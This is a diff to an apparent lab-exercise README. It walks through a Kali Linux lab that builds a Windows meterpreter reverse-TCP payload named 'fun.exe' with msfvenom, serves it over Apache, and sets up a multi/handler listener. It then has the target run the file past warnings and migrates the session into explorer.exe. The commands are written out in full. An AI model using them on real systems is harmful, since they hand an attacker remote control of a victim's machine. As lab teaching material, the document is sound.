@@ -24,36 +24,43 @@ Open terminal and try execute some kali linux commands
 ## EXECUTION STEPS AND ITS OUTPUT:
 
 Find the attackers ip address using ifconfig
+
+<img width="1920" height="1080" alt="KALI 2  Running  - Oracle VirtualBox 25-10-2025 08_33_30" src="https://github.com/user-attachments/assets/4b3b93ef-60d9-4d1e-acae-75ef0d9dce86" />
+
+
 ## OUTPUT:
 
 
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+
+<img width="955" height="150" alt="Screenshot 2025-10-25 091100" src="https://github.com/user-attachments/assets/27cdc760-3991-4b14-af96-e62633b766cf" />
+
+
 ## OUTPUT:
 
 
 copy the fun.exe into the apache /var/www/html folder
+
+<img width="621" height="66" alt="Screenshot 2025-10-25 090956" src="https://github.com/user-attachments/assets/922e33bc-6837-4c31-98d5-8a072f04a495" />
+
 ## OUTPUT:
 
 
 Start apache server
 sudo systemctl apache2 start
+<img width="578" height="71" alt="Screenshot 2025-10-25 091000" src="https://github.com/user-attachments/assets/ee1548d3-759b-4379-afa4-a1e5837cbfa7" />
+
+
+
 ## OUTPUT:
 
-
-Check the status of apache2
-## OUTPUT:
-
+<img width="1920" height="1080" alt="KALI 2  Running  - Oracle VirtualBox 25-10-2025 08_55_00" src="https://github.com/user-attachments/assets/0cecf6a5-750c-46db-8d4b-a339bf04ecfe" />
 
 
 Invoke msfconsole:
-## OUTPUT:
 
-
-
-
-Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 ## OUTPUT:
 
 
@@ -62,29 +69,19 @@ Starting a command and control Server
 use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
+<img width="901" height="144" alt="Screenshot 2025-10-25 091320" src="https://github.com/user-attachments/assets/0261e65b-2411-4059-8e21-3802963957d1" />
 
 ## OUTPUT:
 
 
 
+<img width="801" height="545" alt="KALI 2  Running  - Oracle VirtualBox 25-10-2025 09_13_47" src="https://github.com/user-attachments/assets/2f3ac70c-57fc-44d0-aa2f-a58b7e7f758a" />
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
 The file "fun.exe" downloads. 
-## OUTPUT:
-
-
-
 Bypass any warning boxes, double-click the file, and allow it to run.
 ## OUTPUT:
-
-
-
-On kali/parrot give the command exploit
-## OUTPUT:
-
-
-
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
 ## OUTPUT:
@@ -99,6 +96,7 @@ At the meterpreter > prompt, execute this command:
 migrate -N explorer.exe
 ## OUTPUT:
 
+<img width="1374" height="781" alt="Screenshot 2025-10-25 090651" src="https://github.com/user-attachments/assets/4a6edcdc-6170-4e28-80f3-379d99ab6a18" />
 
 at meterpreter > prompt, execute this command:
 netstat
